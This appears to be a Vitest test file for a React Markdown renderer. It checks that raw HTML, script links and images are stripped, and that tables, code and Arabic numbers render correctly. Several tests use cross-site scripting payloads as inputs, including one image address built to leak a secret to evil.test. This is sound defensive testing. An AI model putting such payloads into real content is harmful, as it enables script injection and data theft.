import { screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";

import { renderWithProviders } from "@/test/render";

import { Markdown } from "./markdown";

function show(text: string) {
  return renderWithProviders(<Markdown text={text} />).container;
}

describe("Markdown", () => {
  it("renders headings, lists and emphasis", () => {
    const box = show("### Title\n\n- **one**\n- two");
    expect(box.querySelector("strong")).toHaveTextContent("one");
    expect(box.querySelectorAll("li")).toHaveLength(2);
    expect(screen.getByText("Title")).toBeInTheDocument();
  });

  it("does not run or render raw HTML", () => {
    const box = show('Before <script>alert(1)</script> <b onclick="x()">bold</b>\n\n<iframe src="https://evil.test"></iframe>');
    expect(box.querySelector("script")).toBeNull();
    expect(box.querySelector("iframe")).toBeNull();
    expect(box.querySelector("b")).toBeNull();
    expect(box.innerHTML).not.toContain("onclick");
  });

  it("renders no image, so a planted address cannot be fetched", () => {
    const box = show('![data](https://evil.test/?q=secret) <img src="x" onerror="alert(1)">');
    expect(box.querySelector("img")).toBeNull();
    expect(box.innerHTML).not.toContain("evil.test");
  });

  it("drops a script link but keeps its words", () => {
    const box = show("[click me](javascript:alert(1))");
    expect(box.querySelector("a")?.getAttribute("href") ?? "").toBe("");
    expect(box).toHaveTextContent("click me");
  });

  it("opens https links safely", () => {
    const link = show("[docs](https://example.com/a)").querySelector("a");
    expect(link).toHaveAttribute("href", "https://example.com/a");
    expect(link).toHaveAttribute("target", "_blank");
    expect(link).toHaveAttribute("rel", "noopener noreferrer nofollow");
  });

  it("keeps a table in its own focusable scroll area", () => {
    const box = show("| A | B |\n| --- | --- |\n| 1 | 2 |");
    const region = box.querySelector("table")?.parentElement;
    expect(region).toHaveAttribute("tabindex", "0");
    expect(region?.className).toContain("overflow-x-auto");
  });

  it("keeps code LTR", () => {
    const box = show("Run `SELECT 1` now\n\n```sql\nSELECT 2\n```");
    expect(box.querySelector("p code")).toHaveAttribute("dir", "ltr");
    expect(box.querySelector("pre")).toHaveAttribute("dir", "ltr");
  });

  it("lets each block find its own direction", () => {
    const box = show("مرحبا بالعالم\n\nHello there");
    expect(box.querySelectorAll('p[dir="auto"]')).toHaveLength(2);
  });

  it("isolates numbers so they stay in order inside Arabic text", () => {
    const box = show("بلغ الإيراد 1,234.50 بزيادة -5.2% هذا العام");
    expect(Array.from(box.querySelectorAll("bdi")).map((n) => n.textContent)).toEqual(["1,234.50", "-5.2%"]);
  });

  it("leaves numbers inside code alone", () => {
    expect(show("`SELECT 100`").querySelector("bdi")).toBeNull();
  });
});
